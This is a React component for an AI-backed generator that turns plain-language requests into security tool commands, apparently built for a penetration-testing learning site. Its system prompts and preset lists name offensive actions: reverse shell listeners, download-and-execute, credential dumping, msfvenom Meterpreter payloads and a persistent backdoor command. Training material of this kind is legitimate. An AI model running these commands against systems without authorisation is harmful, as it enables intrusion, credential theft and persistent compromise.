import React, { useState, useRef, useCallback, useMemo } from "react";
import {
  Box,
  Paper,
  Typography,
  TextField,
  Button,
  IconButton,
  Chip,
  CircularProgress,
  Collapse,
  Tooltip,
  alpha,
  Divider,
  useTheme,
  Select,
  MenuItem,
  FormControl,
  InputLabel,
  Alert,
  List,
  ListItem,
  ListItemButton,
  ListItemIcon,
  ListItemText,
  InputAdornment,
  Table,
  TableBody,
  TableCell,
  TableRow,
} from "@mui/material";
import AutoAwesomeIcon from "@mui/icons-material/AutoAwesome";
import SendIcon from "@mui/icons-material/Send";
import ContentCopyIcon from "@mui/icons-material/ContentCopy";
import CheckIcon from "@mui/icons-material/Check";
import ExpandMoreIcon from "@mui/icons-material/ExpandMore";
import ExpandLessIcon from "@mui/icons-material/ExpandLess";
import TerminalIcon from "@mui/icons-material/Terminal";
import LightbulbIcon from "@mui/icons-material/Lightbulb";
import HistoryIcon from "@mui/icons-material/History";
import TranslateIcon from "@mui/icons-material/Translate";
import PlayArrowIcon from "@mui/icons-material/PlayArrow";
import SecurityIcon from "@mui/icons-material/Security";
import BugReportIcon from "@mui/icons-material/BugReport";
import NetworkCheckIcon from "@mui/icons-material/NetworkCheck";
import StorageIcon from "@mui/icons-material/Storage";
import SearchIcon from "@mui/icons-material/Search";
import FilterListIcon from "@mui/icons-material/FilterList";
import RefreshIcon from "@mui/icons-material/Refresh";
import CodeIcon from "@mui/icons-material/Code";
import InfoOutlinedIcon from "@mui/icons-material/InfoOutlined";

// Wireshark filter syntax colors
const WIRESHARK_COLORS = {
  field: "#3b82f6",      // Blue - protocol fields like ip.addr, tcp.port
  operator: "#8b5cf6",   // Purple - comparison operators ==, !=, >, <
  logical: "#f97316",    // Orange - logical operators &&, ||, !
  value: "#22c55e",      // Green - values like strings, numbers, IPs
  function: "#ec4899",   // Pink - functions like contains, matches
  parenthesis: "#6b7280", // Gray - parentheses
  comment: "#9ca3af",    // Light gray - comments
};

// Parse Wireshark filter into tokens for syntax highlighting
interface FilterToken {
  type: 'field' | 'operator' | 'logical' | 'value' | 'function' | 'parenthesis' | 'whitespace';
  value: string;
}

const parseWiresharkFilter = (filter: string): FilterToken[] => {
  const tokens: FilterToken[] = [];
  let remaining = filter;
  
  // Common Wireshark fields
  const fieldPattern = /^([a-z][a-z0-9_]*(?:\.[a-z][a-z0-9_]*)+)/i;
  // Comparison operators
  const operatorPattern = /^(==|!=|>=|<=|>|<|~=)/;
  // Logical operators
  const logicalPattern = /^(&&|\|\||!(?!=)|and|or|not)\s*/i;
  // Functions
  const functionPattern = /^(contains|matches|eq|ne|gt|lt|ge|le|bitwise_and)\s*/i;
  // String values
  const stringPattern = /^"[^"]*"|^'[^']*'/;
  // Number/IP values
  const valuePattern = /^([0-9]+(?:\.[0-9]+)*(?:\/[0-9]+)?|0x[0-9a-fA-F]+)/;
  // Parentheses
  const parenPattern = /^(\(|\))/;
  // Whitespace
  const wsPattern = /^(\s+)/;
  
  while (remaining.length > 0) {
    let matched = false;
    
    // Try each pattern
    const patterns: [RegExp, FilterToken['type']][] = [
      [wsPattern, 'whitespace'],
      [logicalPattern, 'logical'],
      [functionPattern, 'function'],
      [operatorPattern, 'operator'],
      [parenPattern, 'parenthesis'],
      [stringPattern, 'value'],
      [fieldPattern, 'field'],
      [valuePattern, 'value'],
    ];
    
    for (const [pattern, type] of patterns) {
      const match = remaining.match(pattern);
      if (match) {
        tokens.push({ type, value: match[0] });
        remaining = remaining.slice(match[0].length);
        matched = true;
        break;
      }
    }
    
    // If no pattern matched, take one character as value
    if (!matched) {
      tokens.push({ type: 'value', value: remaining[0] });
      remaining = remaining.slice(1);
    }
  }
  
  return tokens;
};

// Break down filter into logical parts for explanation
interface FilterPart {
  expression: string;
  field?: string;
  operator?: string;
  value?: string;
  description: string;
}

const breakdownWiresharkFilter = (filter: string): FilterPart[] => {
  const parts: FilterPart[] = [];
  
  // Split by logical operators while preserving parentheses grouping
  const expressions = filter.split(/\s*(&&|\|\|)\s*/).filter(s => s && s !== '&&' && s !== '||');
  
  // Common field descriptions
  const fieldDescriptions: Record<string, string> = {
    'ip.addr': 'IP address (source or destination)',
    'ip.src': 'Source IP address',
    'ip.dst': 'Destination IP address',
    'tcp.port': 'TCP port (source or destination)',
    'tcp.srcport': 'TCP source port',
    'tcp.dstport': 'TCP destination port',
    'udp.port': 'UDP port (source or destination)',
    'http.request.method': 'HTTP request method (GET, POST, etc.)',
    'http.response.code': 'HTTP response status code',
    'http.host': 'HTTP Host header value',
    'http.request.uri': 'HTTP request URI path',
    'dns.qry.name': 'DNS query domain name',
    'dns.resp.name': 'DNS response domain name',
    'tls.handshake.type': 'TLS handshake message type',
    'ssl.handshake.type': 'SSL handshake message type',
    'frame.len': 'Total frame length in bytes',
    'tcp.flags': 'TCP flags field',
    'tcp.flags.syn': 'TCP SYN flag',
    'tcp.flags.ack': 'TCP ACK flag',
    'tcp.flags.fin': 'TCP FIN flag',
    'tcp.flags.rst': 'TCP RST flag',
    'eth.addr': 'Ethernet MAC address',
    'icmp.type': 'ICMP message type',
    'smb2.filename': 'SMB2 filename',
    'ftp.request.command': 'FTP command',
    'frame': 'Frame data',
  };
  
  for (const expr of expressions) {
    const cleanExpr = expr.trim().replace(/^\(|\)$/g, '');
    
    // Try to parse as field operator value
    const match = cleanExpr.match(/^([a-z][a-z0-9_.]+)\s*(==|!=|>=|<=|>|<|contains|matches)\s*(.+)$/i);
    
    if (match) {
      const [, field, operator, value] = match;
      const fieldLower = field.toLowerCase();
      const baseField = Object.keys(fieldDescriptions).find(f => fieldLower.startsWith(f)) || fieldLower;
      
      let description = fieldDescriptions[baseField] || `Field: ${field}`;
      
      // Add operator context
      if (operator === '==') description += ' equals';
      else if (operator === '!=') description += ' does not equal';
      else if (operator === '>') description += ' is greater than';
      else if (operator === '<') description += ' is less than';
      else if (operator === '>=') description += ' is at least';
      else if (operator === '<=') description += ' is at most';
      else if (operator.toLowerCase() === 'contains') description += ' contains';
      else if (operator.toLowerCase() === 'matches') description += ' matches regex';
      
      description += ` ${value.replace(/"/g, '')}`;
      
      parts.push({ expression: cleanExpr, field, operator, value, description });
    } else {
      parts.push({ expression: cleanExpr, description: `Filter condition: ${cleanExpr}` });
    }
  }
  
  return parts;
};

// Wireshark Filter Display Component with syntax highlighting
interface WiresharkFilterDisplayProps {
  filter: string;
  accentColor: string;
}

const WiresharkFilterDisplay: React.FC<WiresharkFilterDisplayProps> = ({ filter, accentColor }) => {
  const theme = useTheme();
  const tokens = useMemo(() => parseWiresharkFilter(filter), [filter]);
  const breakdown = useMemo(() => breakdownWiresharkFilter(filter), [filter]);
  const [showBreakdown, setShowBreakdown] = useState(true);
  
  const getTokenColor = (type: FilterToken['type']) => {
    switch (type) {
      case 'field': return WIRESHARK_COLORS.field;
      case 'operator': return WIRESHARK_COLORS.operator;
      case 'logical': return WIRESHARK_COLORS.logical;
      case 'value': return WIRESHARK_COLORS.value;
      case 'function': return WIRESHARK_COLORS.function;
      case 'parenthesis': return WIRESHARK_COLORS.parenthesis;
      default: return 'inherit';
    }
  };
  
  return (
    <Box>
      {/* Syntax-highlighted filter */}
      <Box
        sx={{
          fontFamily: "monospace",
          fontSize: "0.9rem",
          p: 2,
          borderRadius: 2,
          bgcolor: theme.palette.mode === "dark" ? "#0d1117" : "#f6f8fa",
          border: `1px solid ${alpha(accentColor, 0.3)}`,
          overflowX: "auto",
          whiteSpace: "pre-wrap",
          wordBreak: "break-word",
          lineHeight: 1.8,
        }}
      >
        {tokens.map((token, idx) => (
          <span
            key={idx}
            style={{
              color: getTokenColor(token.type),
              fontWeight: token.type === 'logical' || token.type === 'operator' ? 600 : 400,
              backgroundColor: token.type === 'logical' ? alpha(WIRESHARK_COLORS.logical, 0.1) : 'transparent',
              padding: token.type === 'logical' ? '2px 4px' : 0,
              borderRadius: token.type === 'logical' ? 4 : 0,
            }}
          >
            {token.value}
          </span>
        ))}
      </Box>
      
      {/* Color legend */}
      <Box sx={{ display: 'flex', flexWrap: 'wrap', gap: 1, mt: 1.5, mb: 1 }}>
        {[
          { label: 'Field', color: WIRESHARK_COLORS.field },
          { label: 'Operator', color: WIRESHARK_COLORS.operator },
          { label: 'Logic', color: WIRESHARK_COLORS.logical },
          { label: 'Value', color: WIRESHARK_COLORS.value },
          { label: 'Function', color: WIRESHARK_COLORS.function },
        ].map((item) => (
          <Box
            key={item.label}
            sx={{
              display: 'flex',
              alignItems: 'center',
              gap: 0.5,
              fontSize: '0.7rem',
              color: 'text.secondary',
            }}
          >
            <Box
              sx={{
                width: 10,
                height: 10,
                borderRadius: '50%',
                bgcolor: item.color,
              }}
            />
            {item.label}
          </Box>
        ))}
      </Box>
      
      {/* Filter breakdown toggle */}
      {breakdown.length > 0 && (
        <Box sx={{ mt: 2 }}>
          <Box
            onClick={() => setShowBreakdown(!showBreakdown)}
            sx={{
              display: 'flex',
              alignItems: 'center',
              gap: 0.5,
              cursor: 'pointer',
              color: accentColor,
              '&:hover': { opacity: 0.8 },
            }}
          >
            <CodeIcon sx={{ fontSize: 16 }} />
            <Typography variant="subtitle2" fontWeight={600}>
              Filter Breakdown {showBreakdown ? '▼' : '▶'}
            </Typography>
          </Box>
          
          <Collapse in={showBreakdown}>
            <Table size="small" sx={{ mt: 1 }}>
              <TableBody>
                {breakdown.map((part, idx) => (
                  <TableRow key={idx} sx={{ '&:last-child td': { borderBottom: 0 } }}>
                    <TableCell
                      sx={{
                        fontFamily: 'monospace',
                        fontSize: '0.8rem',
                        color: WIRESHARK_COLORS.field,
                        width: '40%',
                        py: 1,
                        verticalAlign: 'top',
                      }}
                    >
                      {part.expression}
                    </TableCell>
                    <TableCell sx={{ fontSize: '0.8rem', py: 1, color: 'text.secondary' }}>
                      <Box sx={{ display: 'flex', alignItems: 'flex-start', gap: 0.5 }}>
                        <InfoOutlinedIcon sx={{ fontSize: 14, mt: 0.3, color: alpha(accentColor, 0.5) }} />
                        {part.description}
                      </Box>
                    </TableCell>
                  </TableRow>
                ))}
              </TableBody>
            </Table>
            
            {/* Logical operator explanation if filter has multiple parts */}
            {breakdown.length > 1 && (
              <Alert 
                severity="info" 
                icon={<InfoOutlinedIcon />}
                sx={{ 
                  mt: 1, 
                  fontSize: '0.75rem',
                  '& .MuiAlert-message': { fontSize: '0.75rem' },
                }}
              >
                {filter.includes('&&') && filter.includes('||') 
                  ? 'This filter uses both AND (&&) and OR (||) logic. AND conditions must all be true; OR means any condition can match.'
                  : filter.includes('&&')
                    ? 'All conditions connected by && (AND) must be true for a packet to match.'
                    : filter.includes('||')
                      ? 'Any condition connected by || (OR) can be true for a packet to match.'
                      : 'Single condition filter.'}
              </Alert>
            )}
          </Collapse>
        </Box>
      )}
    </Box>
  );
};

// Tool-specific preset commands
export interface PresetCommand {
  label: string;
  description: string;
  icon?: React.ReactNode;
  category?: string;
}

export type ToolType = "linux" | "powershell" | "wireshark" | "nmap" | "metasploit";

interface GeneratedCommand {
  command: string;
  explanation: string;
  warnings?: string[];
  alternatives?: string[];
  relatedTips?: string[];
}

interface AICommandConverterProps {
  toolType: ToolType;
  accentColor: string;
  presets: PresetCommand[];
}

// Tool-specific system contexts
const toolContexts: Record<ToolType, string> = {
  linux: `You are an expert Linux/Bash command translator. Convert natural language requests into Linux/Bash commands.
Focus on: file operations, network commands, process management, privilege escalation, hash/crypto, log analysis, and security tools.
Always consider security implications and provide relevant warnings for dangerous commands.
Prefer modern commands (e.g., 'ip' over 'ifconfig', 'ss' over 'netstat') when appropriate.`,

  powershell: `You are an expert PowerShell command translator. Convert natural language requests into PowerShell commands.
Focus on: file operations, network cmdlets, process management, Active Directory, privilege escalation, credential harvesting, and security analysis.
Use proper PowerShell conventions (Verb-Noun format, pipeline operations).
Include warnings for commands that require admin privileges or could be detected by security tools.`,

  wireshark: `You are an expert Wireshark filter translator. Convert natural language requests into Wireshark display filters.
Focus on: protocol filters, IP/port filters, HTTP analysis, TLS/SSL analysis, security analysis, SMB analysis, and compound filters.
Use proper Wireshark filter syntax with operators like ==, contains, matches, &&, ||, !.
Explain what traffic the filter will capture.`,

  nmap: `You are an expert Nmap command translator. Convert natural language requests into Nmap commands.
Focus on: host discovery, port scanning, service detection, NSE scripts, timing options, output formats, and firewall evasion.
Consider scan stealth, timing, and the trade-offs between speed and accuracy.
Include warnings about potentially intrusive scans.`,

  metasploit: `You are an expert Metasploit command translator. Convert natural language requests into Metasploit commands.
Focus on: module search, configuration, exploitation, meterpreter commands, post-exploitation, credential harvesting, and persistence.
Provide step-by-step commands when needed (e.g., use -> set options -> exploit).
Include ethical hacking reminders about proper authorization.`,
};

// Tool-specific preset commands
export const toolPresets: Record<ToolType, PresetCommand[]> = {
  linux: [
    { label: "Find all SUID binaries", description: "Search for privilege escalation opportunities", icon: <SecurityIcon />, category: "Privilege Escalation" },
    { label: "Show all listening ports", description: "List network services", icon: <NetworkCheckIcon />, category: "Network" },
    { label: "Find files modified in last 24 hours", description: "Recent file changes", icon: <HistoryIcon />, category: "File Operations" },
    { label: "Search for passwords in config files", description: "Credential hunting", icon: <SearchIcon />, category: "Credentials" },
    { label: "Get current user privileges", description: "Check sudo permissions", icon: <SecurityIcon />, category: "Privilege Escalation" },
    { label: "Extract strings from binary", description: "Binary analysis", icon: <StorageIcon />, category: "Forensics" },
    { label: "Create a reverse shell listener", description: "Netcat listener on port 4444", icon: <TerminalIcon />, category: "Shells" },
    { label: "Check cron jobs for all users", description: "Scheduled task enumeration", icon: <HistoryIcon />, category: "Persistence" },
  ],
  powershell: [
    { label: "List all running services", description: "Service enumeration", icon: <StorageIcon />, category: "System" },
    { label: "Find Domain Admins", description: "AD privileged users", icon: <SecurityIcon />, category: "Active Directory" },
    { label: "Get recent failed logins", description: "Security log analysis", icon: <BugReportIcon />, category: "Forensics" },
    { label: "Check for stored credentials", description: "Credential manager", icon: <SearchIcon />, category: "Credentials" },
    { label: "List startup programs", description: "Persistence mechanisms", icon: <HistoryIcon />, category: "Persistence" },
    { label: "Download and execute script", description: "In-memory execution", icon: <PlayArrowIcon />, category: "Execution" },
    { label: "Get WiFi passwords", description: "Saved network credentials", icon: <NetworkCheckIcon />, category: "Credentials" },
    { label: "List all AD computers", description: "Domain enumeration", icon: <StorageIcon />, category: "Active Directory" },
  ],
  wireshark: [
    { label: "ip.addr == 192.168.1.1", description: "Filter traffic to/from specific IP", icon: <FilterListIcon />, category: "IP Filter" },
    { label: "tcp.port == 443 && tls", description: "HTTPS/TLS traffic on port 443", icon: <SecurityIcon />, category: "TLS/SSL" },
    { label: "http.request.method == POST", description: "HTTP POST requests only", icon: <NetworkCheckIcon />, category: "HTTP" },
    { label: "dns.qry.name contains google", description: "DNS queries for google domains", icon: <SearchIcon />, category: "DNS" },
    { label: "tcp.flags.syn==1 && tcp.flags.ack==0", description: "Detect SYN scan attempts", icon: <BugReportIcon />, category: "Security" },
    { label: "http.response.code >= 400", description: "HTTP error responses (4xx/5xx)", icon: <SecurityIcon />, category: "HTTP" },
    { label: "smb2.filename contains .exe", description: "SMB file transfers of executables", icon: <StorageIcon />, category: "SMB" },
    { label: "frame contains password", description: "Packets containing 'password' string", icon: <SearchIcon />, category: "Security" },
  ],
  nmap: [
    { label: "nmap -sS -T4 -p- <target>", description: "Full TCP SYN scan all 65535 ports", icon: <NetworkCheckIcon />, category: "Port Scanning" },
    { label: "nmap -sV -sC -O <target>", description: "Version detection + default scripts + OS detection", icon: <SearchIcon />, category: "Service Detection" },
    { label: "nmap --script vuln <target>", description: "Run all vulnerability detection scripts", icon: <BugReportIcon />, category: "NSE Scripts" },
    { label: "nmap -sS -T2 -f <target>", description: "Stealth fragmented SYN scan", icon: <SecurityIcon />, category: "Evasion" },
    { label: "nmap -sn 192.168.1.0/24", description: "Ping sweep to discover live hosts", icon: <NetworkCheckIcon />, category: "Host Discovery" },
    { label: "nmap -sU --top-ports 100 <target>", description: "UDP scan top 100 common ports", icon: <NetworkCheckIcon />, category: "Port Scanning" },
    { label: "nmap -D RND:10 <target>", description: "Scan with 10 random decoy IPs", icon: <SecurityIcon />, category: "Evasion" },
    { label: "nmap --script smb-vuln-ms17-010 <target>", description: "Check for EternalBlue MS17-010", icon: <BugReportIcon />, category: "NSE Scripts" },
  ],
  metasploit: [
    { label: "search type:exploit platform:windows", description: "Find Windows exploit modules", icon: <BugReportIcon />, category: "Search" },
    { label: "use multi/handler; set payload windows/meterpreter/reverse_tcp", description: "Set up Meterpreter reverse shell listener", icon: <TerminalIcon />, category: "Handlers" },
    { label: "run post/windows/gather/hashdump", description: "Dump SAM database password hashes", icon: <SecurityIcon />, category: "Credentials" },
    { label: "run post/multi/recon/local_exploit_suggester", description: "Find privilege escalation exploits", icon: <SearchIcon />, category: "Post-Exploitation" },
    { label: "migrate -N explorer.exe", description: "Migrate to explorer.exe process", icon: <PlayArrowIcon />, category: "Meterpreter" },
    { label: "run persistence -U -i 30 -p 4444 -r <LHOST>", description: "Install persistent backdoor (user startup)", icon: <HistoryIcon />, category: "Persistence" },
    { label: "use auxiliary/scanner/smb/smb_ms17_010", description: "Scan for EternalBlue vulnerability", icon: <BugReportIcon />, category: "Auxiliary" },
    { label: "msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=4444 -f exe", description: "Generate Windows Meterpreter payload", icon: <TerminalIcon />, category: "Payloads" },
  ],
};

const AICommandConverter: React.FC<AICommandConverterProps> = ({
  toolType,
  accentColor,
  presets,
}) => {
  const theme = useTheme();
  const [isExpanded, setIsExpanded] = useState(false);
  const [input, setInput] = useState("");
  const [isLoading, setIsLoading] = useState(false);
  const [result, setResult] = useState<GeneratedCommand | null>(null);
  const [error, setError] = useState<string | null>(null);
  const [copiedCommand, setCopiedCommand] = useState(false);
  const [history, setHistory] = useState<{ query: string; result: GeneratedCommand }[]>([]);
  const [showHistory, setShowHistory] = useState(false);
  const inputRef = useRef<HTMLInputElement>(null);

  const toolNames: Record<ToolType, string> = {
    linux: "Linux/Bash",
    powershell: "PowerShell",
    wireshark: "Wireshark Filter",
    nmap: "Nmap",
    metasploit: "Metasploit",
  };

  const toolIcons: Record<ToolType, React.ReactNode> = {
    linux: "🐧",
    powershell: "⚡",
    wireshark: "🦈",
    nmap: "🔍",
    metasploit: "💀",
  };

  const handleConvert = useCallback(async (query?: string) => {
    const inputText = query || input;
    if (!inputText.trim() || isLoading) return;

    setIsLoading(true);
    setError(null);
    setResult(null);

    try {
      // Get auth token
      const token = localStorage.getItem("vragent_access_token");
      if (!token) {
        throw new Error("Please log in to use the AI command generator");
      }

      const response = await fetch("/api/learn/command-convert", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
          "Authorization": `Bearer ${token}`,
        },
        body: JSON.stringify({
          query: inputText.trim(),
          tool_type: toolType,
          system_context: toolContexts[toolType],
        }),
      });

      if (response.status === 401) {
        throw new Error("Session expired. Please log in again.");
      }

      if (!response.ok) {
        const errorData = await response.json().catch(() => ({}));
        throw new Error(errorData.detail || "Failed to generate command");
      }

      const data = await response.json();
      
      const generatedResult: GeneratedCommand = {
        command: data.command || "",
        explanation: data.explanation || "",
        warnings: data.warnings || [],
        alternatives: data.alternatives || [],
        relatedTips: data.related_tips || [],
      };

      setResult(generatedResult);
      
      // Add to history
      setHistory(prev => [
        { query: inputText.trim(), result: generatedResult },
        ...prev.slice(0, 9), // Keep last 10
      ]);
    } catch (err) {
      console.error("Command conversion error:", err);
      const errorMessage = err instanceof Error ? err.message : "Unknown error occurred";
      setError(errorMessage);
    } finally {
      setIsLoading(false);
    }
  }, [input, isLoading, toolType]);

  const handlePresetClick = (preset: PresetCommand) => {
    setInput(preset.label);
    handleConvert(preset.label);
  };

  const handleHistoryClick = (item: { query: string; result: GeneratedCommand }) => {
    setInput(item.query);
    setResult(item.result);
    setShowHistory(false);
  };

  const copyToClipboard = (text: string) => {
    navigator.clipboard.writeText(text);
    setCopiedCommand(true);
    setTimeout(() => setCopiedCommand(false), 2000);
  };

  const handleKeyPress = (e: React.KeyboardEvent) => {
    if (e.key === "Enter" && !e.shiftKey) {
      e.preventDefault();
      handleConvert();
    }
  };

  return (
    <Paper
      elevation={0}
      sx={{
        border: `1px solid ${alpha(accentColor, 0.3)}`,
        borderRadius: 2,
        overflow: "hidden",
        mb: 3,
        bgcolor: alpha(accentColor, 0.02),
      }}
    >
      {/* Header */}
      <Box
        onClick={() => setIsExpanded(!isExpanded)}
        sx={{
          display: "flex",
          alignItems: "center",
          gap: 1.5,
          p: 2,
          cursor: "pointer",
          bgcolor: alpha(accentColor, 0.05),
          borderBottom: isExpanded ? `1px solid ${alpha(accentColor, 0.2)}` : "none",
          "&:hover": {
            bgcolor: alpha(accentColor, 0.08),
          },
          transition: "background-color 0.2s",
        }}
      >
        <Box
          sx={{
            width: 36,
            height: 36,
            borderRadius: "50%",
            display: "flex",
            alignItems: "center",
            justifyContent: "center",
            bgcolor: alpha(accentColor, 0.15),
            color: accentColor,
          }}
        >
          <AutoAwesomeIcon sx={{ fontSize: 20 }} />
        </Box>
        <Box sx={{ flex: 1 }}>
          <Typography variant="subtitle2" fontWeight={700} sx={{ color: accentColor }}>
            {toolIcons[toolType]} AI {toolNames[toolType]} Command Generator
          </Typography>
          <Typography variant="caption" color="text.secondary">
            Convert natural language to {toolNames[toolType]} commands
          </Typography>
        </Box>
        <Chip
          icon={<TranslateIcon sx={{ fontSize: 14 }} />}
          label="AI Powered"
          size="small"
          sx={{
            bgcolor: alpha(accentColor, 0.1),
            color: accentColor,
            fontWeight: 600,
            fontSize: "0.7rem",
          }}
        />
        <IconButton size="small" sx={{ color: accentColor }}>
          {isExpanded ? <ExpandLessIcon /> : <ExpandMoreIcon />}
        </IconButton>
      </Box>

      {/* Content */}
      <Collapse in={isExpanded}>
        <Box sx={{ p: 2 }}>
          {/* Input Area */}
          <Box sx={{ mb: 2 }}>
            <TextField
              inputRef={inputRef}
              fullWidth
              multiline
              maxRows={3}
              size="small"
              placeholder={`Describe what you want to do... e.g., "${presets[0]?.label || "Find all files modified today"}"`}
              value={input}
              onChange={(e) => setInput(e.target.value)}
              onKeyPress={handleKeyPress}
              disabled={isLoading}
              InputProps={{
                startAdornment: (
                  <InputAdornment position="start">
                    <LightbulbIcon sx={{ color: alpha(accentColor, 0.5), fontSize: 20 }} />
                  </InputAdornment>
                ),
                endAdornment: (
                  <InputAdornment position="end">
                    {history.length > 0 && (
                      <Tooltip title="History">
                        <IconButton
                          size="small"
                          onClick={(e) => {
                            e.stopPropagation();
                            setShowHistory(!showHistory);
                          }}
                          sx={{ mr: 0.5 }}
                        >
                          <HistoryIcon sx={{ fontSize: 18 }} />
                        </IconButton>
                      </Tooltip>
                    )}
                    <Button
                      variant="contained"
                      size="small"
                      onClick={() => handleConvert()}
                      disabled={!input.trim() || isLoading}
                      sx={{
                        bgcolor: accentColor,
                        "&:hover": { bgcolor: alpha(accentColor, 0.85) },
                        minWidth: 100,
                      }}
                      startIcon={isLoading ? <CircularProgress size={16} color="inherit" /> : <AutoAwesomeIcon />}
                    >
                      {isLoading ? "Generating..." : "Generate"}
                    </Button>
                  </InputAdornment>
                ),
              }}
              sx={{
                "& .MuiOutlinedInput-root": {
                  borderRadius: 2,
                  "&.Mui-focused fieldset": {
                    borderColor: accentColor,
                  },
                },
              }}
            />
          </Box>

          {/* History Dropdown */}
          <Collapse in={showHistory && history.length > 0}>
            <Paper
              elevation={2}
              sx={{
                mb: 2,
                maxHeight: 200,
                overflow: "auto",
                border: `1px solid ${alpha(accentColor, 0.2)}`,
              }}
            >
              <List dense disablePadding>
                {history.map((item, idx) => (
                  <ListItemButton
                    key={idx}
                    onClick={() => handleHistoryClick(item)}
                    sx={{
                      borderBottom: idx < history.length - 1 ? `1px solid ${alpha(theme.palette.divider, 0.5)}` : "none",
                    }}
                  >
                    <ListItemIcon sx={{ minWidth: 32 }}>
                      <HistoryIcon sx={{ fontSize: 16, color: alpha(accentColor, 0.5) }} />
                    </ListItemIcon>
                    <ListItemText
                      primary={item.query}
                      secondary={item.result.command.substring(0, 50) + (item.result.command.length > 50 ? "..." : "")}
                      primaryTypographyProps={{ fontSize: "0.8rem", fontWeight: 500 }}
                      secondaryTypographyProps={{ fontSize: "0.7rem", fontFamily: "monospace" }}
                    />
                  </ListItemButton>
                ))}
              </List>
            </Paper>
          </Collapse>

          {/* Preset Commands */}
          <Box sx={{ mb: 2 }}>
            <Typography variant="caption" color="text.secondary" sx={{ display: "block", mb: 1, fontWeight: 600 }}>
              Quick Commands:
            </Typography>
            <Box sx={{ display: "flex", flexWrap: "wrap", gap: 0.75 }}>
              {presets.slice(0, 8).map((preset, idx) => (
                <Tooltip key={idx} title={preset.description} placement="top">
                  <Chip
                    label={preset.label}
                    size="small"
                    onClick={() => handlePresetClick(preset)}
                    icon={preset.icon as React.ReactElement}
                    sx={{
                      fontSize: "0.7rem",
                      height: 26,
                      cursor: "pointer",
                      bgcolor: alpha(accentColor, 0.08),
                      border: `1px solid ${alpha(accentColor, 0.2)}`,
                      "&:hover": {
                        bgcolor: alpha(accentColor, 0.15),
                        borderColor: accentColor,
                      },
                      "& .MuiChip-icon": {
                        fontSize: 14,
                        color: accentColor,
                      },
                    }}
                  />
                </Tooltip>
              ))}
            </Box>
          </Box>

          {/* Error Message */}
          {error && (
            <Alert severity="error" sx={{ mb: 2, borderRadius: 2 }}>
              {error}
            </Alert>
          )}

          {/* Result */}
          {result && (
            <Box>
              <Divider sx={{ mb: 2 }} />
              
              {/* Generated Command */}
              <Box sx={{ mb: 2 }}>
                <Box sx={{ display: "flex", alignItems: "center", justifyContent: "space-between", mb: 1 }}>
                  <Typography variant="subtitle2" fontWeight={700} sx={{ display: "flex", alignItems: "center", gap: 0.5 }}>
                    <TerminalIcon sx={{ fontSize: 16, color: accentColor }} />
                    {toolType === "wireshark" ? "Generated Filter" : "Generated Command"}
                  </Typography>
                  <Tooltip title={copiedCommand ? "Copied!" : "Copy command"}>
                    <IconButton
                      size="small"
                      onClick={() => copyToClipboard(result.command)}
                      sx={{ color: copiedCommand ? "#22c55e" : "inherit" }}
                    >
                      {copiedCommand ? <CheckIcon sx={{ fontSize: 16 }} /> : <ContentCopyIcon sx={{ fontSize: 16 }} />}
                    </IconButton>
                  </Tooltip>
                </Box>
                
                {/* Use specialized display for Wireshark filters */}
                {toolType === "wireshark" ? (
                  <WiresharkFilterDisplay filter={result.command} accentColor={accentColor} />
                ) : (
                  <Box
                    component="pre"
                    sx={{
                      fontFamily: "monospace",
                      fontSize: "0.85rem",
                      p: 2,
                      borderRadius: 2,
                      bgcolor: theme.palette.mode === "dark" ? "#1e1e1e" : "#f5f5f5",
                      border: `1px solid ${alpha(accentColor, 0.2)}`,
                      overflowX: "auto",
                      whiteSpace: "pre-wrap",
                      wordBreak: "break-all",
                      m: 0,
                      color: accentColor,
                    }}
                  >
                    {result.command}
                  </Box>
                )}
              </Box>

              {/* Explanation */}
              {result.explanation && (
                <Box sx={{ mb: 2 }}>
                  <Typography variant="subtitle2" fontWeight={700} sx={{ display: "flex", alignItems: "center", gap: 0.5, mb: 1 }}>
                    <LightbulbIcon sx={{ fontSize: 16, color: "#f59e0b" }} />
                    Explanation
                  </Typography>
                  <Typography variant="body2" color="text.secondary" sx={{ lineHeight: 1.6 }}>
                    {result.explanation}
                  </Typography>
                </Box>
              )}

              {/* Warnings */}
              {result.warnings && result.warnings.length > 0 && (
                <Alert severity="warning" sx={{ mb: 2, borderRadius: 2 }}>
                  <Typography variant="subtitle2" fontWeight={700} sx={{ mb: 0.5 }}>
                    ⚠️ Important Warnings
                  </Typography>
                  <ul style={{ margin: 0, paddingLeft: 16 }}>
                    {result.warnings.map((warning, idx) => (
                      <li key={idx}>
                        <Typography variant="body2">{warning}</Typography>
                      </li>
                    ))}
                  </ul>
                </Alert>
              )}

              {/* Alternatives */}
              {result.alternatives && result.alternatives.length > 0 && (
                <Box sx={{ mb: 2 }}>
                  <Typography variant="subtitle2" fontWeight={700} sx={{ display: "flex", alignItems: "center", gap: 0.5, mb: 1 }}>
                    <RefreshIcon sx={{ fontSize: 16, color: "#6366f1" }} />
                    Alternative Commands
                  </Typography>
                  <Box sx={{ display: "flex", flexDirection: "column", gap: 0.5 }}>
                    {result.alternatives.map((alt, idx) => (
                      <Box
                        key={idx}
                        sx={{
                          display: "flex",
                          alignItems: "center",
                          gap: 1,
                          p: 1,
                          borderRadius: 1,
                          bgcolor: alpha(theme.palette.action.hover, 0.5),
                          cursor: "pointer",
                          "&:hover": { bgcolor: alpha(accentColor, 0.1) },
                        }}
                        onClick={() => copyToClipboard(alt)}
                      >
                        <code style={{ fontSize: "0.75rem", flex: 1 }}>{alt}</code>
                        <ContentCopyIcon sx={{ fontSize: 14, opacity: 0.5 }} />
                      </Box>
                    ))}
                  </Box>
                </Box>
              )}

              {/* Related Tips */}
              {result.relatedTips && result.relatedTips.length > 0 && (
                <Box
                  sx={{
                    p: 1.5,
                    borderRadius: 2,
                    bgcolor: alpha("#10b981", 0.05),
                    border: `1px solid ${alpha("#10b981", 0.2)}`,
                  }}
                >
                  <Typography variant="subtitle2" fontWeight={700} sx={{ display: "flex", alignItems: "center", gap: 0.5, mb: 1, color: "#10b981" }}>
                    💡 Pro Tips
                  </Typography>
                  <ul style={{ margin: 0, paddingLeft: 16 }}>
                    {result.relatedTips.map((tip, idx) => (
                      <li key={idx}>
                        <Typography variant="body2" color="text.secondary" sx={{ fontSize: "0.8rem" }}>
                          {tip}
                        </Typography>
                      </li>
                    ))}
                  </ul>
                </Box>
              )}
            </Box>
          )}
        </Box>
      </Collapse>
    </Paper>
  );
};

export default AICommandConverter;
